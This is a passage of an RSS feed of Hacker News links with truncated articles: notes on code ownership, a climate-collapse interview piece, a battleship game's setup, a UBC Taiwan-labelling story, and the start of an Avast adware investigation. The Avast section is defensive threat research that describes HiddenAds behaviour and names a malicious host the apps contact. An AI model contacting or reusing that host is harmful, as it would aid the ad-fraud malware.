    </undefined></p><h2 id="beyond-conways-law"><a href="#beyond-conways-law" aria-label="beyond conways law permalink"></a>Beyond Conway’s Law</h2><h3 id="development-congestion"><a href="#development-congestion" aria-label="development congestion permalink"></a>Development Congestion</h3><p>When you put too many developers on the same code, it’s hard to keep productive. That’s because the code constantly changes: the code you wrote three days ago is now different, so you have to constantly re-discover what it does. The risk of bug is high.</p><p>This is <em>Development Congestion</em>.</p><p>That’s why if you put more people on a late project, the project will be even later.</p><p>Code reviews and automated tests can mitigate the risk of bugs.</p><h3 id="the-problem-of-having-too-many-contributors"><a href="#the-problem-of-having-too-many-contributors" aria-label="the problem of having too many contributors permalink"></a>The problem of having too many contributors</h3><p><strong>Many minor contributors you have in the last 3 months = higher chances to have bugs</strong>.</p><p>That’s because contributors don’t have the full context of what they change.</p><p>With many contributors, <em>diffusion of responsibility</em> makes the codebase rot because each developer thinks someone else will take care of refactoring.</p><p>Also, many contributors lead to <em>process loss</em> (waste) due to communication overhead.</p><p>Thus, you need to introduce <strong>areas of responsibility</strong> to give teams full ownership. Other teams may contribute through PRs, but one team should own their part, be involved in reviews, and have the final word.</p><p>Finally, <strong>teams should have a broader knowledge boundary (what they know) than their operational boundary (what they change)</strong>. You can make that happen with:</p><ul><li>Teams demoing what they’re working on</li><li>Inter-teams code reviews to spread knowledge</li><li>Make people move between teams</li></ul><h3 id="calculating-the-diffusion-score"><a href="#calculating-the-diffusion-score" aria-label="calculating the diffusion score permalink"></a>Calculating the Diffusion score</h3><p>You can count the number of developers on a specific part of the code from git:</p><pre data-language="bash" data-index="2"><p><code><span><span>git shortlog -s --after=2020-01-12 -- some/module/path | wc -l</span></span></code></p></pre><p>If you analyze the distribution of contributions on a part of the code, you get a <em>Diffusion</em> score:</p><p><undefined>
  <a href="https://understandlegacycode.com/static/02bdece8d042cd9e25d429bfdb5b2c9e/4ba4a/diffusion-formula.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="diffusion formula" title="" src="https://understandlegacycode.com/static/02bdece8d042cd9e25d429bfdb5b2c9e/4ba4a/diffusion-formula.png" srcset="https://understandlegacycode.com/static/02bdece8d042cd9e25d429bfdb5b2c9e/00d96/diffusion-formula.png 148w,https://understandlegacycode.com/static/02bdece8d042cd9e25d429bfdb5b2c9e/0b23c/diffusion-formula.png 295w,https://understandlegacycode.com/static/02bdece8d042cd9e25d429bfdb5b2c9e/4ba4a/diffusion-formula.png 497w" sizes="(max-width: 497px) 100vw, 497px">
    </span>
  </span>
  
  </a>
    </undefined>
<undefined>
  <a href="https://understandlegacycode.com/static/cbb6e1f1ec465eacf6ddc572c3787682/b3297/diffusion-results.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="diffusion results" title="" src="https://understandlegacycode.com/static/cbb6e1f1ec465eacf6ddc572c3787682/b3297/diffusion-results.png" srcset="https://understandlegacycode.com/static/cbb6e1f1ec465eacf6ddc572c3787682/00d96/diffusion-results.png 148w,https://understandlegacycode.com/static/cbb6e1f1ec465eacf6ddc572c3787682/0b23c/diffusion-results.png 295w,https://understandlegacycode.com/static/cbb6e1f1ec465eacf6ddc572c3787682/b3297/diffusion-results.png 474w" sizes="(max-width: 474px) 100vw, 474px">
    </span>
  </span>
  
  </a>
    </undefined></p><p>You can generate an enclosure diagram to identify bottlenecks in your large codebase:</p><p><undefined>
  <a href="https://understandlegacycode.com/static/9552981d4e14928c6b9520a0f25fee0c/c5652/diffusion-diagram.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="diffusion diagram" title="" src="https://understandlegacycode.com/static/9552981d4e14928c6b9520a0f25fee0c/c5652/diffusion-diagram.png" srcset="https://understandlegacycode.com/static/9552981d4e14928c6b9520a0f25fee0c/00d96/diffusion-diagram.png 148w,https://understandlegacycode.com/static/9552981d4e14928c6b9520a0f25fee0c/0b23c/diffusion-diagram.png 295w,https://understandlegacycode.com/static/9552981d4e14928c6b9520a0f25fee0c/c5652/diffusion-diagram.png 466w" sizes="(max-width: 466px) 100vw, 466px">
    </span>
  </span>
  
  </a>
    </undefined></p><h3 id="keep-a-decision-log"><a href="#keep-a-decision-log" aria-label="keep a decision log permalink"></a>Keep a decision log</h3><p><a href="https://understandlegacycode.com/blog/earn-maintainers-esteem-with-adrs">Architecture Decision Record (ADR)</a> are very useful to simply keep track of architectural decisions in the project.</p><p>They help people understand why and how decisions were taken in the past. This is useful to re-evaluate them later in the project, as well as spreading knowledge.</p><h3 id="a-few-management-pitfalls"><a href="#a-few-management-pitfalls" aria-label="a few management pitfalls permalink"></a>A few management pitfalls</h3><p>Adam gives a few pieces of advice to managers, referring to human psychology. Whether you’re a Tech Lead or a non-technical manager, these are gold.</p><p>First, you should never …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://understandlegacycode.com/blog/key-points-of-software-design-x-rays/">https://understandlegacycode.com/blog/key-points-of-software-design-x-rays/</a></em></p>]]>
            </description>
            <link>https://understandlegacycode.com/blog/key-points-of-software-design-x-rays/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23741261</guid>
            <pubDate>Sun, 05 Jul 2020 19:37:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[‘Collapse of civilisation is the most likely outcome’: top climate scientists]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 35 (<a href="https://news.ycombinator.com/item?id=23741179">thread link</a>) | @1qazxsw23edc
<br/>
July 5, 2020 | https://voiceofaction.org/collapse-of-civilisation-is-the-most-likely-outcome-top-climate-scientists/ | <a href="https://web.archive.org/web/*/https://voiceofaction.org/collapse-of-civilisation-is-the-most-likely-outcome-top-climate-scientists/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              
<p>Australia’s top climate scientist says “we are already deep into the trajectory towards collapse” of civilisation, which may now be inevitable because 9 of the 15 known global climate tipping points that regulate the state of the planet have been activated.</p>



<p>Australian National University emeritus professor Will Steffen (pictured) told <em>Voice of Action</em> that there was already a chance we have triggered a “global tipping cascade” that would take us to a less habitable “Hothouse Earth” climate, regardless of whether we reduced emissions.</p>



<p>Steffen says it would take 30 years at best (more likely 40-60 years) to transition to net zero emissions, but when it comes to tipping points such as Arctic sea ice we could have already run out of time. </p>



<p>Evidence shows we will also lose control of the tipping points for the <a rel="noreferrer noopener" href="https://www.theguardian.com/world/2019/jul/25/amazonian-rainforest-near-unrecoverable-tipping-point?CMP=share_btn_tw" data-type="https://www.theguardian.com/world/2019/jul/25/amazonian-rainforest-near-unrecoverable-tipping-point?CMP=share_btn_tw" target="_blank">Amazon rainforest</a>, the West Antarctic ice sheet, and the Greenland ice sheet in much less time than it’s going to take us to get to net zero emissions, Steffen says.</p>



<p>“Given the momentum in both the Earth and human systems, and the growing difference between the ‘reaction time’ needed to steer humanity towards a more sustainable future, and the ‘intervention time’ left to avert a range of catastrophes in both the physical climate system (e.g., melting of Arctic sea ice) and the biosphere (e.g., loss of the Great Barrier Reef), we are already deep into the trajectory towards collapse,” said Steffen.</p>



<p>“That is, the intervention time we have left has, in many cases, shrunk to levels that are shorter than the time it would take to transition to a more sustainable system.</p>



<p>“The fact that many of the features of the Earth System that are being damaged or lost constitute ‘tipping points’ that could well link to form a ‘tipping cascade’ raises the ultimate question: Have we already lost control of the system? Is collapse now inevitable?”</p>



<p>This is not a unique view – leading Stanford University biologists, who were first to reveal that we are already experiencing the sixth mass extinction on Earth, released <a href="https://www.theguardian.com/environment/2020/jun/01/sixth-mass-extinction-of-wildlife-accelerating-scientists-warn" data-type="https://www.theguardian.com/environment/2020/jun/01/sixth-mass-extinction-of-wildlife-accelerating-scientists-warn" target="_blank" rel="noreferrer noopener">new research this week</a> showing species extinctions are accelerating in an unprecedented manner, which may be a tipping point for the collapse of human civilisation.</p>



<p>Also in the past week <a rel="noreferrer noopener" href="https://www.smh.com.au/environment/climate-change/australia-among-global-hot-spots-as-droughts-worsen-in-warming-world-20200601-p54ydh.html?btis" data-type="https://www.smh.com.au/environment/climate-change/australia-among-global-hot-spots-as-droughts-worsen-in-warming-world-20200601-p54ydh.html?btis" target="_blank">research emerged</a> showing the world’s major food baskets will experience more extreme droughts than previously forecast, with southern Australia among the worst hit globally.</p>



<p>Steffen used the metaphor of the Titanic in one of his recent talks to describe how we may cross tipping points faster than the time it would take us to react to get our impact on the climate under control.</p>



<p>“If the Titanic realises that it’s in trouble and it has about 5km that it needs to slow and steer the ship, but it’s only 3km away from the iceberg, it’s already doomed,” he said.</p>



<h3>‘This is an existential threat to civilization’</h3>



<p>Steffen, along with some of the world’s most eminent climate scientists, laid out our predicament in the starkest possible terms in a <a href="https://www.nature.com/articles/d41586-019-03595-0" data-type="https://www.nature.com/articles/d41586-019-03595-0" target="_blank" rel="noreferrer noopener">piece for the journal Nature</a> at the end of last year.</p>



<p>They found that 9 of the 15 known Earth tipping elements that regulate the state of the planet had been activated, and there was now scientific support for declaring a state of planetary emergency. These tipping points can trigger abrupt carbon release back into the atmosphere, such as the release of carbon dioxide and methane caused by the irreversible thawing of the Arctic permafrost.</p>



<figure><img src="https://voiceofaction.org/wp-content/uploads/2020/06/tipping-points-climate-change-nature-comment-1.jpg" alt="" srcset="https://voiceofaction.org/wp-content/uploads/2020/06/tipping-points-climate-change-nature-comment-1.jpg 907w, https://voiceofaction.org/wp-content/uploads/2020/06/tipping-points-climate-change-nature-comment-1-300x209.jpg 300w, https://voiceofaction.org/wp-content/uploads/2020/06/tipping-points-climate-change-nature-comment-1-768x536.jpg 768w, https://voiceofaction.org/wp-content/uploads/2020/06/tipping-points-climate-change-nature-comment-1-143x100.jpg 143w, https://voiceofaction.org/wp-content/uploads/2020/06/tipping-points-climate-change-nature-comment-1-500x349.jpg 500w, https://voiceofaction.org/wp-content/uploads/2020/06/tipping-points-climate-change-nature-comment-1-690x482.jpg 690w" sizes="(max-width: 907px) 100vw, 907px"><figcaption>9 of 15 known Earth tipping points have been activated</figcaption></figure>



<p>“If damaging tipping cascades can occur and a global tipping point cannot be ruled out, then this is an existential threat to civilization,” they wrote.</p>



<p>“No amount of economic cost–benefit analysis is going to help us. We need to change our approach to the climate problem.</p>



<p>“The evidence from tipping points alone suggests that we are in a state of planetary emergency: both the risk and urgency of the situation are acute.”</p>



<p>Steffen is also the lead author of the heavily cited 2018 paper, <a rel="noreferrer noopener" href="https://www.pnas.org/content/115/33/8252" data-type="https://www.pnas.org/content/115/33/8252" target="_blank">Trajectories of the Earth System in the Anthropocene</a>, where he found that “even if the Paris Accord target of a 1.5°C to 2°C rise in temperature is met, we cannot exclude the risk that a cascade of feedbacks could push the Earth System irreversibly onto a ‘Hothouse Earth’ pathway.”</p>



<p>Steffen is a global authority on the subject of tipping points, which are prone to sudden shifts if they get pushed hard enough by a changing climate, and could take the trajectory of the system out of human control. Further warming would become self-sustaining due to system feedbacks and their mutual interaction.</p>



<p>Steffen describes it like a row of dominos and his concern is we are already at the point of no return, knocking over the first couple of dominos which could lead to a cascade knocking over the whole row.</p>



<p>“Some of these we think are vulnerable in the temperature range we’re entering into now,” said Steffen.</p>



<p>“If we get those starting to tip we could get the whole row of dominos tipping and take us to a much hotter climate even if we get our emissions down.”</p>



<p>Even the notoriously conservative United Nations Intergovernmental Panel on Climate Change (IPCC) has found that already with the 1.1°C of warming we have had to date, there was a moderate risk of tipping some of these – and the risk increased as the temperatures increased.</p>



<p>Steffen believes we are committed to at least a 1.5°C temperature rise given the momentum in the economic and climate system, but we still have a shot at staying under 2°C with urgent action.</p>



<h3>+4°C world would support &lt; 1 billion people</h3>



<p>Professor Hans Joachim Schellnhuber, director emeritus and founder of the Potsdam Institute for Climate Impact Research, believes if we go much above 2°C we will quickly get to 4°C anyway because of the tipping points and feedbacks, which would spell the end of human civilisation.</p>



<figure><img src="https://voiceofaction.org/wp-content/uploads/2020/06/15341907941_4ecef6f665_k-1024x680.jpg" alt="" srcset="https://voiceofaction.org/wp-content/uploads/2020/06/15341907941_4ecef6f665_k-1024x680.jpg 1024w, https://voiceofaction.org/wp-content/uploads/2020/06/15341907941_4ecef6f665_k-300x199.jpg 300w, https://voiceofaction.org/wp-content/uploads/2020/06/15341907941_4ecef6f665_k-768x510.jpg 768w, https://voiceofaction.org/wp-content/uploads/2020/06/15341907941_4ecef6f665_k-1536x1020.jpg 1536w, https://voiceofaction.org/wp-content/uploads/2020/06/15341907941_4ecef6f665_k-151x100.jpg 151w, https://voiceofaction.org/wp-content/uploads/2020/06/15341907941_4ecef6f665_k-500x332.jpg 500w, https://voiceofaction.org/wp-content/uploads/2020/06/15341907941_4ecef6f665_k-690x458.jpg 690w, https://voiceofaction.org/wp-content/uploads/2020/06/15341907941_4ecef6f665_k.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>“There is a very big risk that we will just end our civilisation”: Professor Schellnhuber</figcaption></figure>



<p>Johan Rockström, the head of one of Europe’s leading research institutes, warned in 2019 that in a 4°C-warmer world it would be “difficult to see how we could accommodate a billion people or even half of that … There will be a rich minority of people who survive with modern lifestyles, no doubt, but it will be a turbulent, conflict-ridden world”.</p>



<p>Schellnhuber, one of the world’s leading authorities on climate change, said that if we continue down the present path “there is a very big risk that we will just end our civilisation. The human species will survive somehow but we will destroy almost everything we have built up over the last two thousand years.”</p>



<p>Schellnhuber said in a <a rel="noreferrer noopener" href="https://youtu.be/4PTRTwn3wrg" data-type="https://youtu.be/4PTRTwn3wrg" target="_blank">recent interview</a> that the IPCC report stating we could stay below 1.5°C of warming was “slightly dishonest” because it relies on immense negative emissions (pulling CO2 out of the air) which was not viable at global scale. He said 1.5°C was no longer achievable but it was still possible to stay under 2°C with massive changes to society.</p>



<p>If we don’t bend the emissions curve down substantially before 2030 then keeping temperatures under 2°C becomes unavoidable. The “carbon law” <a rel="noreferrer noopener" href="https://science.sciencemag.org/content/355/6331/1269" data-type="https://science.sciencemag.org/content/355/6331/1269" target="_blank">published in the journal Science</a> in 2017 found that, to hold warming below 2°C, emissions would need to be cut in half between 2020 and 2030.</p>



<p>Steffen told <em>Voice of Action</em> that the three main challenges to humanity – climate change, the degradation of the biosphere and the growing inequalities between and among countries – were “just different facets of the same fundamental problem”.</p>



<p>This problem was the “neoliberal economic system” that spread across the world through globalisation, underpinning “high production high consumption lifestyles” and a “religion built not around eternal life but around eternal growth”.</p>



<p>“It is becoming abundantly clear that (i) this system is incompatible with a well-functioning Earth System at the planetary level; (ii) this system is eroding human- and societal-well being, even in the wealthiest countries, and (iii) collapse is the most likely outcome of the present trajectory of the current system, as prophetically modelled in 1972 in the Limits to Growth work,” Steffen told <em>Voice of Action</em>.</p>



<h3>Eternal growth is not possible</h3>



<p>The <a href="https://www.clubofrome.org/report/the-limits-to-growth/" data-type="https://www.clubofrome.org/report/the-limits-to-growth/" target="_blank" rel="noreferrer noopener">Limits to Growth model</a> released by the Club of Rome in 1972 looked at the interplay between food production, industry, population, non-renewable resources and pollution.</p>



<p>The basic findings were that you can’t grow the system indefinitely as you will cause environmental and resource issues that will ultimately cause the whole global system to collapse (ABC’s This Day Tonight program covered it <a rel="noreferrer noopener" href="https://www.youtube.com/watch?v=cCxPOqwCr1I" data-type="https://www.youtube.com/watch?v=cCxPOqwCr1I" target="_blank">here</a>). At the time of the model’s release it accurately reproduced the historical data from 1900 to 1970.</p>



<p>A <a rel="noreferrer noopener" href="https://www.sciencedirect.com/science/article/abs/pii/S0959378008000435" data-type="https://www.sciencedirect.com/science/article/abs/pii/S0959378008000435" target="_blank">2008 study</a> by Graham Turner, then a senior CSIRO research scientist, used three decades of real-world historical data to conclude that the Limits to Growth model’s predictions were coming to pass: “30 years of historical data compare favourably with key features of a business-as-usual [BAU] scenario called the ‘standard run’ scenario, which results in collapse of the global system midway through the 21st century.”</p>



<figure><img src="https://voiceofaction.org/wp-content/uploads/2020/06/grahamturner-1024x547.jpg" alt="" srcset="https://voiceofaction.org/wp-content/uploads/2020/06/grahamturner-1024x547.jpg 1024w, https://voiceofaction.org/wp-content/uploads/2020/06/grahamturner-300x160.jpg 300w, https://voiceofaction.org/wp-content/uploads/2020/06/grahamturner-768x410.jpg 768w, https://voiceofaction.org/wp-content/uploads/2020/06/grahamturner-187x100.jpg 187w, https://voiceofaction.org/wp-content/uploads/2020/06/grahamturner-500x267.jpg 500w, https://voiceofaction.org/wp-content/uploads/2020/06/grahamturner-690x369.jpg 690w, https://voiceofaction.org/wp-content/uploads/2020/06/grahamturner.jpg 1226w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Former CSIRO scientist Graham Turner has been warning about collapse for decades</figcaption></figure>



<p>Turner ran updated figures through the model <a rel="noreferrer noopener" href="https://www.ingentaconnect.com/contentone/oekom/gaia/2012/00000021/00000002/art00010" data-type="https://www.ingentaconnect.com/contentone/oekom/gaia/2012/00000021/00000002/art00010" target="_blank">again in 2012</a> for another peer-reviewed paper, and <a rel="noreferrer noopener" href="https://sustainable.unimelb.edu.au/__data/assets/pdf_file/0005/2763500/MSSI-ResearchPaper-4_Turner_2014.pdf" data-type="https://sustainable.unimelb.edu.au/__data/assets/pdf_file/0005/2763500/MSSI-ResearchPaper-4_Turner_2014.pdf" target="_blank">again in 2014</a> when he had joined the University of Melbourne’s Sustainable Society Institute.</p>



<p>“Data from the forty years or so since the LTG study was completed indicates that the world is closely tracking the BAU scenario,” Turner concluded in the 2014 paper.</p>



<p>“It is notable that there does not appear to be other economy-environment models that have demonstrated such comprehensive and long-term data agreement.”</p>



<p>Turner semi-retired in 2015 but runs a small organic market garden on a rural property in the NSW south coast’s Bega Valley.</p>



<p>He and his wife grow most of their own food and live off grid powered by a …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://voiceofaction.org/collapse-of-civilisation-is-the-most-likely-outcome-top-climate-scientists/">https://voiceofaction.org/collapse-of-civilisation-is-the-most-likely-outcome-top-climate-scientists/</a></em></p>]]>
            </description>
            <link>https://voiceofaction.org/collapse-of-civilisation-is-the-most-likely-outcome-top-climate-scientists/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23741179</guid>
            <pubDate>Sun, 05 Jul 2020 19:27:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Destroyer2 – Open Source Battleship Game]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23741169">thread link</a>) | @unonymous
<br/>
July 5, 2020 | https://umcconnell.github.io/destroyer2/ | <a href="https://web.archive.org/web/*/https://umcconnell.github.io/destroyer2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="app" data-server-rendered="true"><div><header> <a href="https://umcconnell.github.io/destroyer2/" aria-current="page"><!----> <span>Destroyer2</span></a> </header>   <main aria-labelledby="main-title"><header><img src="https://umcconnell.github.io/destroyer2/logo.svg" alt="hero"> <!----> <p>
      A real-time multiplayer battleship game
    </p> <p><a href="https://umcconnell.github.io/destroyer2/guide/">
  Get Started →
</a></p></header> <div><div><h2>Fast</h2> <p>Enjoy great performance with Node.js™, Redis™ and WebSockets.</p></div><div><h2>Simple</h2> <p>Simple server setup and deployment. Check the guide for simple deployment instructions, including for Docker™!</p></div><div><h2>Powerful</h2> <p>Automatic room cleanup, network loss resilience, and more!</p></div></div> <div><h3 id="quick-start"><a href="#quick-start">#</a> Quick start</h3> <div><pre><code><span># Clone</span>
<span>git</span> clone https://github.com/umcconnell/destroyer2.git
<span>cd</span> destroyer2

<span># Setup</span>
<span># Make sure you have docker and docker-compose installed!</span>
./docker/deploy.sh simple

<span># Done!</span>
<span># Visit http://localhost:8080 to get started</span>
</code></pre></div></div> <!----></main></div></div></div>]]>
            </description>
            <link>https://umcconnell.github.io/destroyer2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23741169</guid>
            <pubDate>Sun, 05 Jul 2020 19:24:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[UBC quietly changes references to Taiwan amid sensitive political climate]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 6 (<a href="https://news.ycombinator.com/item?id=23741119">thread link</a>) | @abc-xyz
<br/>
July 5, 2020 | https://www.ubyssey.ca/news/taiwan-references-changed/ | <a href="https://web.archive.org/web/*/https://www.ubyssey.ca/news/taiwan-references-changed/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <p>UBC has quietly made a significant change in the way it refers to Taiwan in its annual enrolment report.</p><p>In <a href="https://academic.ubc.ca/sites/vpa.ubc.ca/files/documents/2018-19%20Enrolment%20Report.pdf" target="_blank"><u>past reports</u></a>, the university simply listed the island as “Taiwan,” but in the recent <a href="https://bog3.sites.olt.ubc.ca/files/2020/01/4_2020.02_Enrolment-Annual-Report.pdf" target="_blank"><u>2019/20</u></a> enrolment report, it was lengthier: “Taiwan (Province of China).”</p><p>In a written statement from Kurt Heinrich, UBC Media Relations senior communications director, he said this is because in 2018, UBC’s data governance steering committee adopted International Organization for Standardization (ISO) data standards.</p>
<p>The ISO, which is recognized by the United Nations, has referred to Taiwan as “Province of China” <a href="https://www.taiwannews.com.tw/en/news/3812381" target="_blank"><u>since 1974</u></a> under ISO 3166, and the UN switched its recognition of China from the Republic of China (Taiwan) to the People’s Republic of China (Mainland China) in 1971.</p><p>In a later email, the university stated that the adoption of ISO standards was “necessary for the university’s successful transition to Workday,” UBC’s partner for its software overhaul that will replace aging systems. Elsewhere on UBC websites, however, the island is still referred to as “Taiwan.”</p><p>The nature of Taiwan’s sovereignty is a deeply political debate. Taiwan, which boasts its own democratically elected government, claims to be an independent nation. Mainland China, on the other hand, claims Taiwan to be an integral province of China.</p><p>“To put ‘Province of China’ after the name is to politicize the name,” said Dr. Timothy Brook, a UBC professor and an expert in Chinese history.</p><p>Many countries have <a href="https://www.newsweek.com/who-recognizes-taiwan-two-change-china-1460559" target="_blank"><u>switched their allegiance</u></a> from Taipei to Beijing in recent decades. In 1970, Canada severed diplomatic ties with Taipei in favour of Beijing, but Canada and Taiwan maintain strong trade and informal ties.</p><p>UBC’s decision to make the change to label Taiwan as a “Province of China” came at a low point in Chinese–Canadian relations, following the <a href="https://www.ctvnews.ca/world/trudeau-says-china-made-obvious-link-between-meng-and-two-michaels-1.4994128" target="_blank"><u>arrests</u></a> of Huawei CFO Meng Wanzhou in Vancouver, and the <a href="https://www.theglobeandmail.com/politics/article-china-suggests-it-will-free-two-michaels-if-canada-allows-huawei/" target="_blank"><u>two Michaels</u></a> in China, which Brook described as “political hostage taking.”</p>
<p>For UBC, the stakes for appeasing China are high. Huawei has granted <a href="https://nationalpost.com/news/meng-wanzhou-arrest-caused-ubc-leaders-concern-over-enrolment-fundraising-internal-documents-show" target="_blank"><u>$9.5 million</u></a> in funding for research projects at UBC in recent years, which continued even after Meng’s December 2018 arrest.</p><p>Chinese students make up more than one third of all international students at UBC. In 2019/20, international student tuition made up <a href="https://bog3.sites.olt.ubc.ca/files/2020/04/2.1_2020.04_Budget-Fiscal-2020-2021.pdf" target="_blank"><u>$507 million</u></a> in revenue compared to $386 million from domestic students. Rising Canadian–Chinese tensions have made UBC administrators fear potential impacts on Chinese student enrolment and funding.</p><p>In 2019, Vice-Provost International Murali Chandrashekaran sent an <a href="https://nationalpost.com/news/meng-wanzhou-arrest-caused-ubc-leaders-concern-over-enrolment-fundraising-internal-documents-show" target="_blank"><u>email</u></a> to colleagues calling for a campus-wide meeting to address this, “given our significant reliance on China for students/$.”</p><p>If diplomatic tensions reach a point where China restricts students from going to UBC, as<a href="https://www.ubyssey.ca/news/ubc-urges-saudi-arabia-students-to-contact-enrolment-services/" target="_blank"><u> Saudi Arabia did in 2018</u></a>, UBC could face a significant <a href="https://theprovince.com/pmn/news-pmn/canada-news-pmn/credit-agency-warns-big-risk-to-canadian-schools-if-china-pulls-students/wcm/268ed61c-89fd-41e0-8a2d-3aba815152e3" target="_blank"><u>credit risk</u></a>, according to prominent credit agency Moody’s.</p><p>Anxieties surrounding Chinese interference also exist at other Canadian universities. At McMaster University, a Chinese student group had its club status <a href="https://www.scmp.com/news/china/diplomacy/article/3036309/chinese-student-association-mcmaster-university-loses-appeal" target="_blank"><u>revoked</u></a> after allegations it reported a talk by a Uyghur–Canadian woman to the Chinese consulate. At the University of Toronto, Chemi Lhamo, student union president and Canadian of Tibetan origins, was met with widespread <a href="https://www.cbc.ca/news/canada/toronto/china-tibet-student-election-1.5019648" target="_blank"><u>backlash</u></a> by Chinese students after her election win.</p>
<p>Yves Tiberghien, a UBC political science professor focusing on China and the Asia-Pacific Region, said he “can’t imagine” that the change in recognition of Taiwan in the recent enrolment report was due to Chinese financial influence.</p><p>“If I had to guess,” he added, the technical committee that decided this likely “did not have the full knowledge” of the sensitive political nature of the Taiwan–China relationship.</p><p>According to Brook, however, it is “entirely possible” that there were some Chinese pressures. “I wouldn’t be surprised if every Chinese consulate in Canada was going around and looking at things like universities to see how [they] refer to Taiwan, but I have no evidence of this,” he said. “It would be entirely in keeping with the kind of broader diplomatic initiatives that the [People’s Republic of China]’s been making over the last five years.”</p><p>While the university claims the decision was made for technical purposes, it did not respond to a follow-up email asking whether the committee responsible for the change was aware of the political context around the name.</p><p>“I wish they hadn’t done it,” said Tiberghien. “I don’t think it’s a good idea because it’s stepping into something that’s raw right now … the last thing you want is to step into this now.”</p>
      
      </div></div>]]>
            </description>
            <link>https://www.ubyssey.ca/news/taiwan-references-changed/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23741119</guid>
            <pubDate>Sun, 05 Jul 2020 19:15:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[HiddenAds up to no good again and spreading via Android gaming apps]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23741108">thread link</a>) | @realpanzer
<br/>
July 5, 2020 | https://decoded.avast.io/jakubvavra/hiddenads-up-to-no-good-again-and-spreading-via-android-gaming-apps/ | <a href="https://web.archive.org/web/*/https://decoded.avast.io/jakubvavra/hiddenads-up-to-no-good-again-and-spreading-via-android-gaming-apps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1870">

                    
                    
                    
                    <div>
                        
<p>I recently discovered a large campaign of HiddenAds on the Google Play Store, spreading via gaming apps. The initial discovery was made through an apklab.io automated detection that was based on similar features of a previous HiddenAds campaign that was present on the Play Store. Upon further analysis of the app through <a href="https://www.apklab.io/">apklab.io</a>, Avast’s mobile threat intelligence platform, I was able to identify a wider campaign by comparing similar activities, features, and network traffic. In total, I found 47 apps.</p>



<p>The apps’ poor reviews on the Play Store, combined with their capability to hide their icon and display ads outside the apps confirmed that they are part of the HiddenAds family.</p>



<h2><strong>One app leads to 47&nbsp;</strong></h2>



<p>Once I determined that the <a href="https://play.google.com/store/apps/details?id=com.dancing.color.road.ball.run.music">Dancing Run</a> app I found belongs to the HiddenAds family, I utilized <a href="https://www.apklab.io/">apklab.io</a> to conduct a search for similar apps.&nbsp;</p>



<p>I started my search by looking at the app’s entry points, as apklab.io groups apps with the same activities, receivers and services. The ability to see how many apps share an entry point is a useful feature in identifying unique shared features, and helped me find a set of entry points created for the original app.</p>



<div><figure><img src="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/twitter-thread-1.png" alt="" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/twitter-thread-1.png 1022w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/twitter-thread-1-300x173.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/twitter-thread-1-768x443.png 768w" sizes="(max-width: 1022px) 100vw, 1022px"><figcaption>Entrypoints section of apklab.io.</figcaption></figure></div>



<p>I then searched the apklab.io database for apps with these unique entry points by using <strong>service:com.alive.ALiveService. </strong>To further narrow down the search results, I added the <strong>is:PlayFrosting</strong> parameter to find similar apps on the Play Store.</p>



<div><figure><img src="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/twitter-thread-2-1-1024x671.png" alt="" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/twitter-thread-2-1-1024x671.png 1024w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/twitter-thread-2-1-300x197.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/twitter-thread-2-1-768x503.png 768w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/twitter-thread-2-1.png 1064w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Filtering search results to narrow down APKs on Play Store.</figcaption></figure></div>



<p>Apklab.io allows various filtering criteria in its search. I conducted another search with <strong>f:HideApplicationIconFromLauncher </strong>to identify apps that hide their icon from the launcher.</p>



<p>Continuing the search, I was able to discover more similar apps using the network dump dynamic feature. It collects information on the app network activity and in this case a specific URL was accessed by several of these apps.</p>



<div><figure><img src="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/URL-Dynamic-1024x429.png" alt="" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/URL-Dynamic-1024x429.png 1024w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/URL-Dynamic-300x126.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/URL-Dynamic-768x322.png 768w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/URL-Dynamic.png 1182w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Dynamic network dump results.</figcaption></figure></div>



<p>I used the URL search filter <strong>host:”res.resvivinew.com”</strong> and found additional HiddenAds apps that shared this URL connection.</p>



